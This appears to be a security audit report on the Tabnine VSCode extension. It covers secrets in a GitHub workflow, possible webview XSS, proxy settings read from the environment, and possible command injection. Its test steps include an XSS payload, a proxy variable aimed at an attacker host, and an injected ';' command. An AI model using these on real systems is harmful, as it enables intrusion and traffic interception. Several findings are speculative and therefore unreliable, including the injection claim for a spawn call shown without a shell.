- Vulnerability Name: Hardcoded Secrets in GitHub Workflow

- Description:
  - The GitHub workflow file `/code/.github/workflows/tmp.yml` directly embeds secrets into a file named `vscode-vars` within the workflow execution environment.
  - Step-by-step:
    1. An attacker analyzes the GitHub workflow file `/code/.github/workflows/tmp.yml` and identifies the "Set stable version file" step.
    2. The attacker observes that this step uses `echo` commands to write the values of GitHub secrets (e.g., `secrets.GCS_RELEASE_KEY`, `secrets.INSTRUMENTATION_KEY`, etc.) directly into a file named `vscode-vars`.
    3. If an attacker gains unauthorized access to the GitHub Actions workflow run (e.g., through compromised GitHub account or misconfigured repository permissions), they can access the `vscode-vars` file within the runner's environment and extract the hardcoded secrets.
    4. Even without direct runner access, if the `vscode-vars` file is unintentionally exposed (e.g., through misconfigured upload actions or debugging logs), the secrets become accessible to unauthorized parties.

- Impact:
  - **Critical**: Exposure of sensitive secrets like `GCS_RELEASE_KEY`, `INSTRUMENTATION_KEY`, `MODIFIER_PAT`, `OVSX_PAT`, `SLACK_RELEASES_CHANNEL_WEBHOOK_URL`, `SLACK_VALIDATE_MARKETPLACE_WEBHOOK`, and `VSCE_PAT`.
  - These secrets could allow an attacker to:
    - Upload malicious releases to Google Cloud Storage (GCS) (`GCS_RELEASE_KEY`).
    - Impersonate the extension and publish malicious updates to the VSCode Marketplace and Open VSX Registry (`VSCE_PAT`, `OVSX_PAT`).
    - Modify the extension's display name on marketplaces (`MODIFIER_PAT`).
    - Send unauthorized messages to internal Slack channels (`SLACK_RELEASES_CHANNEL_WEBHOOK_URL`, `SLACK_VALIDATE_MARKETPLACE_WEBHOOK`).
    - Gain access to telemetry data (`INSTRUMENTATION_KEY`).

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
  - Secrets are stored as GitHub secrets, which are intended to be protected from direct exposure in the repository code.
  - Workflow file is located in `.github/workflows`, which is not directly accessible to external users of the VSCode extension.

- Missing Mitigations:
  - **Avoid hardcoding secrets in workflow files**: Secrets should not be written to files within the workflow environment. Instead, secrets should be used directly by GitHub Actions steps that require them, without persisting them to disk.
  - **Principle of least privilege**: Evaluate if all listed secrets are truly needed in this workflow. Reduce the number of secrets handled if possible.
  - **Review workflow access control**: Ensure that GitHub repository permissions are correctly configured to prevent unauthorized access to workflow runs.
  - **Secret scanning**: Implement and enable GitHub secret scanning to detect accidental secret exposure in code.

- Preconditions:
  - Threat actor needs to gain unauthorized access to GitHub Actions workflow runs or the `vscode-vars` file if it is unintentionally exposed.

- Source Code Analysis:
  - File: `/code/.github/workflows/tmp.yml`
  ```yaml
  - name: Set stable version file
    run: |
      echo ${{ secrets.GCS_RELEASE_KEY }} > vscode-vars
      echo ${{ secrets.INSTRUMENTATION_KEY }} >> vscode-vars
      echo ${{ secrets.MODIFIER_PAT }} >> vscode-vars
      echo ${{ secrets.OVSX_PAT }} >> vscode-vars
      echo ${{ secrets.SLACK_RELEASES_CHANNEL_WEBHOOK_URL }} >> vscode-vars
      echo ${{ secrets.SLACK_VALIDATE_MARKETPLACE_WEBHOOK }} >> vscode-vars
      echo ${{ secrets.VSCE_PAT }} >> vscode-vars

  - name: Authenticate to Google Cloud
    uses: "google-github-actions/auth@v1"
    with:
      credentials_json: ${{ secrets.GCS_RELEASE_KEY }}

  - name: ⬆️ Upload latest stable version to GCS
    uses: google-github-actions/upload-cloud-storage@v1
    with:
      path: vscode-vars
      destination: tabnine
      parent: false
      gzip: false
      headers: |-
        content-type: text/plain
  ```
  - The `Set stable version file` step explicitly writes secret values to the `vscode-vars` file.
  - Subsequent steps, such as `Authenticate to Google Cloud` and `⬆️ Upload latest stable version to GCS`, might use secrets indirectly but the initial exposure occurs in the `Set stable version file` step.

- Security Test Case:
  1. **Setup**:
     - Assume access to the GitHub repository with "Read" permissions (typical for an external attacker).
     - Fork the repository or create a local clone.
  2. **Analysis**:
     - Examine the workflow file `/code/.github/workflows/tmp.yml` to identify the "Set stable version file" step and the hardcoded secret writing pattern.
  3. **Simulate Workflow Execution (if possible)**:
     -  If possible, trigger a workflow run (e.g., via `workflow_dispatch` if enabled and accessible).
     -  Inspect the workflow run logs or runner environment (if accessible) to confirm the creation of the `vscode-vars` file and the presence of secrets within it.
  4. **Attempt Secret Extraction**:
     - If runner access or log access is possible, attempt to retrieve the `vscode-vars` file and extract the secrets.
  5. **Verify Impact**:
     - Using the extracted secrets (especially `VSCE_PAT` or `OVSX_PAT`), attempt to perform unauthorized actions, such as publishing a test extension version to the marketplace (on a test/staging marketplace if available to avoid real-world impact).
  6. **Expected Result**:
     - Successful extraction of secrets from the workflow environment (if access is gained).
     - Potential for unauthorized actions using the extracted secrets, demonstrating the vulnerability's impact.
  7. **Remediation**:
     - Modify the workflow to eliminate hardcoded secret writing to files.
     - Implement proper secret management practices in GitHub Actions.

- Vulnerability Name: Potential Cross-Site Scripting (XSS) in Webviews

- Description:
  - The project utilizes VSCode webviews to display dynamic content within the extension (e.g., Tabnine Hub, Getting Started, Chat Widget). If data rendered in these webviews is not properly sanitized and includes user-controlled or externally influenced content, it could be vulnerable to XSS attacks.
  - Step-by-step:
    1. An attacker identifies a webview in the Tabnine extension that renders dynamic content, such as the Tabnine Chat Widget or Hub.
    2. The attacker attempts to inject malicious JavaScript code into data that is displayed within the webview. This could be achieved through various means, depending on how data flows into the webview (e.g., manipulating API responses, exploiting vulnerabilities in data processing before rendering).
    3. If the webview's HTML templates or JavaScript code do not properly sanitize or encode the attacker-controlled data before rendering it in the webview, the malicious JavaScript code will be executed within the context of the webview.
    4. The attacker-controlled JavaScript code can then perform actions within the webview's context, such as:
        - Stealing user data or session tokens if accessible within the webview's scope.
        - Redirecting the user to malicious websites.
        - Performing actions on behalf of the user within the Tabnine extension's functionalities exposed in the webview.

- Impact:
  - **High**: Successful XSS attacks in webviews can compromise the security and integrity of the VSCode extension and potentially the user's VSCode environment.
  - Impact severity depends on the scope and permissions of the webview context and the sensitivity of data accessible within it. In the context of a VSCode extension, XSS could potentially be leveraged to gain access to local resources or interact with VSCode APIs in unintended ways.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
  - The code base does not explicitly show any sanitization or encoding functions being used before rendering dynamic data in webviews in the provided files.

- Missing Mitigations:
  - **Input sanitization and output encoding**: Implement robust input sanitization and output encoding mechanisms for all dynamic data rendered within webviews.
  - **Content Security Policy (CSP)**: Implement a strict Content Security Policy for webviews to limit the capabilities of JavaScript code executed within them and mitigate the impact of XSS attacks.
  - **Regular security audits**: Conduct regular security audits of webview code and data flow to identify and remediate potential XSS vulnerabilities.
  - **Framework-level protection**: If using a framework for webview development (e.g., React), leverage built-in XSS protection mechanisms provided by the framework.

- Preconditions:
  - The Tabnine VSCode extension must be rendering dynamic content within webviews.
  - The dynamic content must include user-controlled or externally influenced data that is not properly sanitized.

- Source Code Analysis:
  - Files like `/code/src/webview/webviewTemplates.ts`, `/code/src/hub/createHubTemplate.ts`, `/code/src/tabnineChatWidget/ChatViewProvider.ts`, and files in `/code/src/tabnineChatWidget/webviews/` indicate the use of webviews to render HTML content.
  - For example, `/code/src/webview/webviewTemplates.ts` uses template literals to construct HTML strings, potentially embedding variables directly into the HTML output:
  ```typescript
  export const createIFrameTemplate = (url: string): string => `
  <!DOCTYPE html>
  <html lang="en" style="margin: 0; padding: 0; min-width: 100%; min-height: 100%">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Tabnine Hub</title>
      </head>
      <body style="margin: 0; padding: 0; min-width: 100%; min-height: 100%">
        <iframe src="${url}" id="config" frameborder="0" style="display: block; margin: 0; padding: 0; position: absolute; min-width: 100%; min-height: 100%; visibility: visible;"></iframe>
      </body>
  </html>`;
  ```
  - If the `url` variable in `createIFrameTemplate` or similar variables in other webview template functions are derived from user input or external sources without sanitization, XSS vulnerabilities could arise.
  - Need to analyze the code that uses these templates to determine the source and sanitization of the data being rendered in webviews.

- Security Test Case:
  1. **Setup**:
     - Install the Tabnine VSCode extension in a test VSCode environment.
     - Identify a webview within the extension (e.g., Tabnine Chat Widget, Hub).
  2. **Identify Injection Points**:
     - Analyze the webview's HTML source code and JavaScript code to identify potential injection points where attacker-controlled data could be rendered.
     - Look for URLs, text content, or any dynamic data being embedded into the webview.
  3. **Craft Malicious Payload**:
     - Create a malicious payload containing JavaScript code designed to execute within the webview context (e.g., `<script>alert('XSS')</script>`).
  4. **Inject Payload**:
     - Attempt to inject the malicious payload into the identified injection points. This might involve:
         - Manipulating API requests or responses if the webview data is fetched from an external source.
         - Crafting specific inputs or user actions that could influence the data rendered in the webview.
  5. **Verify XSS Execution**:
     - Observe if the injected JavaScript code executes within the webview. In a basic test, a JavaScript `alert()` box appearing would confirm successful XSS.
     - For more advanced testing, attempt to perform more impactful actions via XSS, such as trying to access local storage, cookies, or redirecting to an external site.
  6. **Expected Result**:
     - If the malicious JavaScript code executes, it confirms the presence of an XSS vulnerability.
  7. **Remediation**:
     - Implement input sanitization and output encoding for all dynamic data rendered in the webview.
     - Enforce a strict Content Security Policy for the webview.

- Vulnerability Name: Insecure Proxy Configuration via Environment Variables

- Description:
  - The extension in `proxyProvider.ts` retrieves proxy settings from both VSCode configuration ("http.proxy") and environment variables (HTTPS_PROXY, https_proxy, HTTP_PROXY, http_proxy). While proxy support is a legitimate feature, relying on environment variables for proxy settings can introduce security risks if these environment variables are not securely managed or are susceptible to manipulation by an attacker.
  - Step-by-step:
    1. An attacker gains control over the environment where VSCode or the Tabnine extension is running. This could be through local system access, compromised remote development environments, or exploiting other vulnerabilities.
    2. The attacker sets malicious proxy settings in environment variables like `HTTPS_PROXY`, `https_proxy`, `HTTP_PROXY`, or `http_proxy`.
    3. When the Tabnine extension initializes and uses `proxyProvider.ts` to retrieve proxy settings, it will unknowingly pick up the attacker-controlled proxy settings from the environment variables.
    4. All network requests made by the Tabnine extension that utilize proxy support will now be routed through the attacker-controlled proxy server.
    5. The attacker can then intercept, monitor, and potentially modify network traffic between the Tabnine extension and its backend servers. This could lead to:
        - Data exfiltration: Sensitive data transmitted by the extension could be intercepted by the attacker.
        - Man-in-the-middle attacks: The attacker could modify network responses from Tabnine servers, potentially injecting malicious code or data into the extension's communication.
        - Credential theft: If authentication tokens or credentials are transmitted through proxied requests, they could be intercepted by the attacker.

- Impact:
  - **High**: Compromising the proxy configuration can have significant security implications, potentially allowing for data breaches, man-in-the-middle attacks, and unauthorized access.
  - The impact is elevated because it affects network communications, which are crucial for the extension's core functionality.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
  - The code retrieves proxy settings from VSCode configuration as a primary source, which is generally considered more secure than relying solely on environment variables.
  - The extension checks a configuration setting `tabnine.useProxySupport` to determine whether to use proxy support at all. If disabled, the vulnerability is not exploitable.

- Missing Mitigations:
  - **Environment variable isolation**:  VSCode extensions should ideally avoid relying on environment variables for security-sensitive configurations like proxy settings, as environment variables can be less securely managed than VSCode's configuration system.
  - **Warning for environment variable proxies**: If environment variables are used, the extension should provide a clear warning to users about the potential security risks associated with environment-variable-based proxy configurations and recommend using VSCode configuration instead.
  - **Secure proxy authentication**: If proxy support is enabled, ensure that secure proxy authentication mechanisms are used (e.g., authenticated proxy) to prevent unauthorized proxy access.
  - **Input validation for proxy URLs**: Implement validation checks for proxy URLs retrieved from both configuration and environment variables to ensure they conform to expected formats and protocols, reducing the risk of injection attacks.

- Preconditions:
  - The Tabnine VSCode extension's proxy support feature must be enabled (`tabnine.useProxySupport` setting).
  - A threat actor must be able to control environment variables in the environment where VSCode/Tabnine is running.

- Source Code Analysis:
  - File: `/code/src/proxyProvider.ts`
  ```typescript
  export function getProxySettings(): string | undefined {
    let proxy: string | undefined = workspace
      .getConfiguration()
      .get<string>("http.proxy");
    if (!proxy) {
      proxy =
        process.env.HTTPS_PROXY ||
        process.env.https_proxy ||
        process.env.HTTP_PROXY ||
        process.env.http_proxy;
    }
    // ...
    return proxy;
  }
  ```
  - The `getProxySettings` function prioritizes VSCode configuration but falls back to retrieving proxy settings from environment variables if the VSCode configuration is not set.
  - This fallback mechanism is where the vulnerability lies, as environment variables can be manipulated by an attacker.

- Security Test Case:
  1. **Setup**:
     - Install the Tabnine VSCode extension in a test VSCode environment.
     - Enable proxy support in Tabnine's settings (`tabnine.useProxySupport: true`).
  2. **Set Malicious Proxy Environment Variable**:
     - In the test environment, set a malicious proxy server address using environment variables (e.g., `export HTTPS_PROXY="http://malicious-proxy.attacker.com:8080"` in Linux/macOS or `setx HTTPS_PROXY "http://malicious-proxy.attacker.com:8080"` in Windows).
  3. **Trigger Network Request**:
     - Perform an action in the Tabnine extension that triggers a network request (e.g., request code completion, open Tabnine Hub, check for updates).
  4. **Monitor Network Traffic**:
     - Use a network monitoring tool (e.g., Wireshark, tcpdump) or set up a controlled proxy server (e.g., using mitmproxy or Burp Suite) at the malicious proxy address.
  5. **Verify Proxy Usage**:
     - Check if the network traffic from the Tabnine extension is being routed through the malicious proxy server specified in the environment variable.
  6. **Intercept/Modify Traffic (Optional)**:
     - If a controlled proxy server is used, attempt to intercept and modify the network traffic between the Tabnine extension and Tabnine servers to demonstrate the potential for man-in-the-middle attacks.
  7. **Expected Result**:
     - Network traffic from the Tabnine extension is routed through the attacker-controlled proxy server specified in environment variables, demonstrating the vulnerability.
  8. **Remediation**:
     - Remove or minimize reliance on environment variables for proxy configuration.
     - If environment variables are necessary, implement warnings and security recommendations for users.
     - Consider restricting proxy configuration sources to VSCode configuration only for enhanced security.

- Vulnerability Name: Potential Command Injection via Unsanitized Binary Path

- Description:
  - The `runProcess` function in `/code/src/binary/runProcess.ts` executes external commands using `child_process.spawn`. If the `command` argument to `runProcess` is derived from an untrusted source or is not properly sanitized, it could be vulnerable to command injection attacks. While the immediate code doesn't show direct external input influencing the command path, it's crucial to verify the sources of the `command` argument throughout the codebase.
  - Step-by-step:
    1. An attacker identifies a way to influence the `command` argument passed to the `runProcess` function. This could be through:
        - Manipulating configuration settings that indirectly affect the binary path.
        - Exploiting other vulnerabilities to inject data that controls the binary path.
    2. The attacker crafts a malicious binary path that includes command injection payloads. For example, instead of a legitimate binary path, the attacker provides a path like: `/path/to/tabnine-binary; malicious-command`.
    3. When `runProcess` is called with this attacker-controlled `command` path, `child_process.spawn` will execute the command. Due to insufficient sanitization, the injected command payload after the semicolon (`;`) will be interpreted as a separate command and executed by the shell.
    4. The attacker-injected command can then perform arbitrary actions on the system with the privileges of the Tabnine extension process, potentially leading to:
        - Remote code execution: The attacker can execute arbitrary code on the user's machine.
        - Data exfiltration: Sensitive data can be stolen from the user's system.
        - System compromise: The attacker can fully compromise the user's system.

- Impact:
  - **Critical**: Command injection vulnerabilities are extremely severe as they can allow for arbitrary code execution and full system compromise.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
  - The provided code snippets do not show explicit sanitization of the `command` argument before being passed to `child_process.spawn`.
  - The code does use `runBinary` function to get the binary path which fetches it from secure locations, reducing immediate risk, but still needs closer inspection of how `runBinary` is called and if the resulting path is ever influenced by external factors.

- Missing Mitigations:
  - **Input sanitization**: Implement robust input sanitization for the `command` argument in `runProcess` to prevent command injection. Ensure that the binary path is validated and does not contain any shell metacharacters or malicious payloads.
  - **Parameterization**: If possible, use parameterized command execution mechanisms that separate commands from arguments to prevent injection. However, `child_process.spawn` does not directly support parameterization for the command path itself.
  - **Principle of least privilege**: Ensure that the Tabnine extension process runs with the minimum necessary privileges to limit the impact of a command injection vulnerability.
  - **Code review**: Conduct a thorough code review to identify all call sites of `runProcess` and verify the sources and sanitization of the `command` argument.

- Preconditions:
  - A threat actor must be able to influence the `command` argument passed to the `runProcess` function.
  - The `runProcess` function must be called with `shell: true` option or similar configurations that enable shell interpretation of commands (not explicitly shown in the provided code, but needs to be verified in the full codebase).

- Source Code Analysis:
  - File: `/code/src/binary/runProcess.ts`
  ```typescript
  import { spawn, SpawnOptions } from "child_process";

  export function runProcess(
    command: string,
    args?: ReadonlyArray<string>,
    options: SpawnOptions = {}
  ): BinaryProcessRun {
    // ...
    const proc = args ? spawn(command, args, options) : spawn(command, options);
    // ...
    return { proc, readLine };
  }
  ```
  - The `runProcess` function directly passes the `command` argument to `child_process.spawn`.
  - If the `command` variable's value is ever influenced by external input without proper validation, it becomes a potential command injection vulnerability.
  - Need to trace back how `runProcess` is used throughout the codebase and where the `command` argument originates to assess the risk. Files like `/code/src/binary/runBinary.ts` which calls `runProcess` should be examined to see how the `command` (binary path) is constructed.

- Security Test Case:
  1. **Setup**:
     - Modify the Tabnine extension code (for testing purposes only) to allow influencing the `command` argument in `runProcess`. For example, introduce a configuration setting that allows users to specify a custom binary path.
  2. **Craft Malicious Command Path**:
     - Set the custom binary path configuration to a malicious command path that includes a command injection payload. For example: `/path/to/tabnine-binary; touch /tmp/pwned`.
  3. **Trigger Binary Execution**:
     - Perform an action in the Tabnine extension that triggers the execution of the binary via `runProcess` (e.g., request code completion, start the extension).
  4. **Verify Command Injection**:
     - Check if the injected command (e.g., `touch /tmp/pwned` in the example) was executed on the system. In this case, verify if the file `/tmp/pwned` was created.
  5. **Attempt More Impactful Actions**:
     - If command injection is successful, attempt to execute more impactful commands, such as reverse shells or data exfiltration commands, to demonstrate the full potential impact of the vulnerability.
  6. **Expected Result**:
     - The injected command is executed on the system, confirming the presence of a command injection vulnerability.
  7. **Remediation**:
     - Implement input sanitization for the `command` argument in `runProcess`.
     - Restrict the source of the binary path to trusted and controlled locations.
     - Avoid using `shell: true` or similar options in `child_process.spawn` if not absolutely necessary.
